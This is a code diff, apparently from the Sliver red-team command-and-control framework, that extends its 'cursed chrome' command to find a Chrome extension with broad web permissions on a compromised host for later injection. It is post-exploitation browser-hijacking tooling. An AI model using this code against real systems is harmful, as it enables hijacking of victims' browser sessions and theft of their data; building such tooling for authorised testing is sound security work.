@@ -30,6 +30,7 @@ import (
 	"github.com/AlecAivazis/survey/v2"
 	"github.com/bishopfox/sliver/client/console"
 	"github.com/bishopfox/sliver/client/core"
+	"github.com/bishopfox/sliver/client/overlord"
 	"github.com/bishopfox/sliver/client/tcpproxy"
 	"github.com/bishopfox/sliver/protobuf/clientpb"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
@@ -43,6 +44,9 @@ var (
 	ErrUnsupportedOS            = errors.New("unsupported OS")
 
 	windowsDriveLetters = "CDEFGHIJKLMNOPQRSTUVWXYZ"
+
+	cursedChromePermissions    = []string{overlord.AllURLs, overlord.WebRequest, overlord.WebRequestBlocking}
+	cursedChromePermissionsAlt = []string{overlord.AllHTTP, overlord.AllHTTPS, overlord.WebRequest, overlord.WebRequestBlocking}
 )
 
 // CursedChromeCmd - Execute a .NET assembly in-memory
@@ -71,7 +75,36 @@ func CursedChromeCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
 			return
 		}
 	}
-	startCursedChromeProcess(true, session, ctx, con)
+
+	curse, err := startCursedChromeProcess(true, session, ctx, con)
+	if err != nil {
+		con.PrintErrorf("%s\n", err)
+		return
+	}
+
+	con.PrintInfof("Searching for Chrome extension with all permissions ... ")
+	chromeExt, err := overlord.FindExtensionWithPermissions(curse, cursedChromePermissions)
+	if err != nil {
+		con.PrintErrorf("%s\n", err)
+		return
+	}
+	// There is one alternative set of permissions that we can use if we don't find an extension
+	// with all the proper permissions.
+	if chromeExt == nil {
+		chromeExt, err = overlord.FindExtensionWithPermissions(curse, cursedChromePermissionsAlt)
+		if err != nil {
+			con.PrintErrorf("%s\n", err)
+			return
+		}
+	}
+	if chromeExt != nil {
+		con.Printf("success!\n")
+		con.Printf("Found Chrome extension: %s (%s)\n", chromeExt.Title, chromeExt.ID)
+
+	} else {
+		con.Printf("failure!\n")
+		con.PrintInfof("No suitable extension was found to inject into :(\n")
+	}
 }
 
 func startCursedChromeProcess(restore bool, session *clientpb.Session, ctx *grumble.Context, con *console.SliverConsoleClient) (*core.CursedProcess, error) {
@@ -134,11 +167,19 @@ func startCursedChromeProcess(restore bool, session *clientpb.Session, ctx *grum
 	tcpProxy.AddRoute(bindAddr, channelProxy)
 	core.Portfwds.Add(tcpProxy, channelProxy)
 
+	curse := &core.CursedProcess{
+		BindTCPPort:       bindPort,
+		Platform:          session.GetOS(),
+		ChromeExePath:     chromeExePath,
+		ChromeUserDataDir: chromeUserDataDir,
+	}
+	core.CursedProcesses.Store(session.ID, curse)
 	go func() {
 		err := tcpProxy.Run()
 		if err != nil {
 			log.Printf("Proxy error %s", err)
 		}
+		core.CursedProcesses.Delete(session.ID)
 	}()
 
 	con.PrintInfof("Port forwarding %s -> %s\n", bindAddr, remoteAddr)
@@ -212,7 +253,7 @@ func findChromeUserDataDir(session *clientpb.Session, ctx *grumble.Context, con 
 		return "", ErrUserDataDirNotFound
 
 	default:
-		return "", errors.New("Unsupported OS")
+		return "", ErrUnsupportedOS
 	}
 }
 
